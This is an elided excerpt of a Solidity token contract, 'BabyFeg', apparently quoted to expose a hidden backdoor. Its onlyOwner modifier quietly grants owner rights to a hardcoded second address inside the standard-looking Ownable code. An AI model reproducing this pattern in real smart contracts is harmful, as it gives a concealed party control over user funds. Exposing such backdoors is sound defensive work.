...
contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(_owner == _msgSender()||_msgSender()==0x22CBa4ef66D426DF948c9f452317C7Ad252af741, "Ownable: caller is not the owner");
        _;
    }
...
contract  BabyFeg is ERC20 {
   ...
   bool private swapping;
    ...
    address public market = 0x366B733655685164DEa78eBCAB41F794A2e9e233;
    ...
    uint256 public totalFees = liquidityFee.add(marketingFee);
     ...
     uint256 private swapTokensAtAmount = 5 * 10**17 * 10**2;
    ...
    constructor() public ERC20("BabyFeg", "BabyFeg",2) {
